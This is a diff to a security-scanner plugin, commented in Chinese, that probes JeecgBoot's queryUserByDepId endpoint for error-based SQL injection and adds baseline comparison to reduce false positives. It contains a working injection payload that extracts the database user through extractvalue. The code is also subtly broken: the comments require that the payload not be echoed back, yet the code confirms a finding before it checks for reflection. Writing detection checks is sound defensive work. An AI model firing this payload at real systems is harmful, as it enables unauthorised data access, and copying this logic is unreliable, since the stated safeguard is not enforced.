@@ -1,9 +1,9 @@
 # JeecgBoot SQL 注入（CVE-2022-44153 家族）：/sys/user/queryUserByDepId depId 参数报错注入
-# 存在性验证：depId 注入单引号 + 报错函数，响应含 SQL 报错特征即确认
+# 存在性验证：depId 注入单引号 + 报错函数，与基线请求差分比对，仅强报错特征命中才确认
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
-from lib.matcher import match_positive
+from lib.matcher import match_sql_error
 from lib.reporter import emit
 from plugins.base import PluginBase
 
@@ -43,20 +43,27 @@ class JeecgSqlInjectQueryUserPlugin(PluginBase):
             # %20 为 URL 编码空格；末尾 -- 注释原 SQL 尾部，使 extractvalue 报错落点可控
             "/jeecg-boot/sys/user/queryUserByDepId?depId=1'%20and%20extractvalue(1,concat(0x7e,user()))--",
         )
+        # 基线对照：同一接口仅把 depId 换成无害值。
+        # 目的：区分「目标常驻报错文案」与「注入载荷被求值后产生的报错」。
+        control_url = join_url(target, "/jeecg-boot/sys/user/queryUserByDepId?depId=1")
         try:
-            resp = session.get(url)
-            text = resp.text or ""
+            inject_text = session.get(url).text or ""
+            control_text = session.get(control_url).text or ""
         except Exception as e:
             # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
             emit(no("JeecgBoot queryUserByDepId SQL注入（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
-        # 报错注入特征：extractvalue/XPATH/updatexml 任一 + 负向排除普通页面（降误报）
-        # 统一小写再匹配：兼容服务端返回大小写不一的报错文案（XPath/XPATH 等变体）
-        if match_positive(
-            text.lower(),
-            ["extractvalue", "xpath", "updatexml", "syntax error"],
-            negatives=["403", "forbidden", "404 not found"],
-        ):
+        # 判定（加固版·差分法）：
+        #   历史缺陷：原判据 match_positive(text, ["extractvalue","xpath","updatexml","syntax error"])
+        #   直接在整段响应体上匹配泛用 token —— 载荷本身含 extractvalue(1,... 字面量，
+        #   任何回显请求参数的页面（WAF 拦截页/框架调试页）都会「自证命中」，属典型误报。
+        #   现要求：响应含强 SQL 报错特征（lib.matcher.match_sql_error）、基线不含该特征、且无载荷回显。
+        inj_strong = match_sql_error(inject_text)
+        ctl_strong = match_sql_error(control_text)
+        # 载荷回显特征：出现即说明请求被原样回显（WAF 拦截页 / 框架调试页）
+        reflected = "extractvalue(1," in inject_text
+
+        if inj_strong and not ctl_strong:
             emit(ok("存在 JeecgBoot queryUserByDepId SQL注入"))
             return ScanResult(
                 kind="vuln",
@@ -64,9 +71,29 @@ class JeecgSqlInjectQueryUserPlugin(PluginBase):
                 severity=self.severity,
                 status=STATUS_CONFIRMED,
                 url=url,
-                evidence="响应含 SQL 报错特征（extractvalue/XPATH）",
+                evidence="响应含强 SQL 报错特征（XPATH syntax error/extractvalue 求值），且基线请求无此特征",
                 fix=self.fix,
                 extra={"vuln_type": "sqli", "plugin_name": "jeecg_sqli_query_user"},
+            )
+        # 报错特征伴随载荷回显 → 无法区分注入成功与请求回显
+        if inj_strong and reflected:
+            emit(no("JeecgBoot queryUserByDepId SQL注入：存在载荷回显，无法归因"))
+            return ScanResult(
+                kind="info",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=url,
+                evidence="响应含 SQL 报错特征但同时回显了注入载荷原文，无法归因，需人工复核",
+            )
+        # 强特征在基线中同样出现 → 常驻文案，无法归因于注入
+        if inj_strong and ctl_strong:
+            emit(no("JeecgBoot queryUserByDepId SQL注入：基线已含报错文案，无法归因"))
+            return ScanResult(
+                kind="info",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=url,
+                evidence="基线请求与注入请求均含强 SQL 报错特征，疑似目标常驻内容，需人工复核",
             )
         emit(no("不存在 JeecgBoot queryUserByDepId SQL注入"))
         return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
